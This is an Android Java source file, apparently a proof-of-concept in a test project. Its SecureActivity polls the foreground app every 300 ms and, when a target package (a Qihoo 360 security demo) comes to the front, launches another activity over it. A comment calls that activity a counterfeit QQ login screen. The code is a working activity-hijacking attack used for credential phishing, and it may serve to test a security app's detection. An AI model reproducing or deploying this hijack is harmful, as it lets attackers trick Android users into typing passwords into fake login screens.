package com.example.activity.function;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import com.example.activity.CommonTestActivity;
import com.example.androidtest.R;

public class SecureActivity extends Activity {
    private String[] targetComponents=new String[]{"com.qihoo360.safeqrdemo"};
    private boolean mStopService;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_secure);
        testHijack();
    }
    private void testHijack(){
        final ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        new Thread(){
            @Override
            public void run() {
                super.run();
                while(!mStopService){
                    String pkgName = activityManager
                            .getRunningTasks(1).get(0).topActivity.getPackageName();
                    Log.v("ly-s", "comint activity:"+pkgName);
                    for(String targetname: targetComponents){
                        if(targetname.equals(pkgName)){
                            hijacking(pkgName);
                            break;
                        }
                    }

                    try {
                        sleep(300);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }.start();
    }
    private void hijacking(String pkgName) {
        if(targetComponents[0].equals(pkgName)){//safeqr
            Log.v("ly-s", "给我吧，safeqr demo:"+pkgName);
            Intent intent = new Intent(this, CommonTestActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);//弹出山寨版qq登录界面
            mStopService=true;
        }
    }


}
